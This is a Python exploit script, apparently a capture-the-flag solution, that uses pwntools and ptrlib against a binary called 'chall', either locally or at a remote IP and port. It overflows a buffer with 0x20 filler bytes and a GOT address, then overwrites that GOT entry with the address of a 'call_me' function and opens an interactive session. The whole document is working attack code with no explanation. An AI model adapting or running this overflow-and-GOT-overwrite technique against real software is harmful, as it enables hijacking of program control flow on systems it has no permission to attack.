#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chall")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("34.170.146.252", 22533)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    good_got = 0x404080
    call_me = 0x4016DE

    payload = b""
    payload += b"A" * 0x20
    payload += ptr.p64(good_got)

    io.sendlineafter(b"choice: ", b"1")
    io.sendlineafter(b"c_str: ", payload)

    io.sendlineafter(b"choice: ", b"3")
    io.sendlineafter(b"str: ", ptr.p64(call_me))

    io.interactive()
    return


if __name__ == "__main__":
    main()
